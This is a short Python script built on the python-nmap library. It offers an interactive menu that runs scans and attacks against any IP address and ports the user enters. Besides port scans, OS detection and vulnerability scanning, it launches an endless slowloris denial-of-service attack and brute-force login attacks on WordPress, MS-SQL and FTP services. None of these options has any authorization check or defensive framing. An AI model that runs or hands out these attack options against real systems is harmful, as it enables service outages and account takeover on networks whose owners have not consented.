import nmap

scanner = nmap.PortScanner()

print('Welcome')
print('===============')

ip_addr = input('Please enter the IP address you want to scan: ')
print('The IP you entered is: ' + ip_addr)

ports = input('Please enter the ports you want to scan e.g(1-1024): ')
print('The ports you entered are: ' + ports)

res = input(
    """
    \nPlease enter the type of scan you want to run:
    1. SYN ACK Scan
    2. UDP Scan
    3. Comprehensive Scan
    4. CVE detection
    5. DOS
    6. Wordpress brute force attack
    7. MS-SQL brute force attack
    8. FTP brute force attack\n
    """
)
print("\nYou have selected the option: " + res)

if res == '1':
    print('Nmap Version: ', scanner.nmap_version())
    scanner.scan(ip_addr, ports, '-v -sS')
    print(scanner.scaninfo())
    print("IP Status: ", scanner[ip_addr].state())
    print(scanner[ip_addr].all_protocols())
    print('Open ports: ', scanner[ip_addr]['tcp'].keys())
elif res == '2':
    print('Nmap Version: ', scanner.nmap_version())
    scanner.scan(ip_addr, ports, '-v -sU')
    print(scanner.scaninfo())
    print("IP Status: ", scanner[ip_addr].state())
    print(scanner[ip_addr].all_protocols())
    print('Open ports: ', scanner[ip_addr]['udp'].keys())
elif res == '3':
    print('Nmap Version: ', scanner.nmap_version())
    scanner.scan(ip_addr, ports, '-v -sS -sV -sC -A -O')
    print(scanner.scaninfo())
    print("IP Status: ", scanner[ip_addr].state())
    print("OS: ", scanner[ip_addr]['osmatch'][0]['osclass'][0]['osfamily'], scanner[ip_addr]['osmatch'][0]['osclass'][0]['vendor'])
    print(scanner[ip_addr].all_protocols())
    print('Open ports: ', scanner[ip_addr]['tcp'].keys())
elif res == '4':
    print('Nmap Version: ', scanner.nmap_version())
    scanner.scan(ip_addr, ports, '-Pn --script vuln')
    print(scanner.scaninfo())
    print(scanner._scan_result)
    print("IP Status: ", scanner[ip_addr].state())
elif res == '5':
    print('Nmap Version: ', scanner.nmap_version())
    scanner.scan(ip_addr, ports, '-max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true')
    print(scanner.scaninfo())
    print(scanner._scan_result)
    print("IP Status: ", scanner[ip_addr].state())
elif res == '6':
    print('Nmap Version: ', scanner.nmap_version())
    scanner.scan(ip_addr, ports, "-sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true'")
    print(scanner.scaninfo())
    print(scanner._scan_result)
    print("IP Status: ", scanner[ip_addr].state())
elif res == '7':
    print('Nmap Version: ', scanner.nmap_version())
    scanner.scan(ip_addr, '1433', "--script ms-sql-brute --script-args 'userdb=customuser.txt,passdb=custompass.txt'")
    print(scanner.scaninfo())
    print(scanner._scan_result)
    print("IP Status: ", scanner[ip_addr].state())
elif res == '8':
    print('Nmap Version: ', scanner.nmap_version())
    scanner.scan(ip_addr, '21', "--script ftp-brute")
    print(scanner.scaninfo())
    print(scanner._scan_result)
    print("IP Status: ", scanner[ip_addr].state())
else:
    print('Please enter a valid option.')
    exit()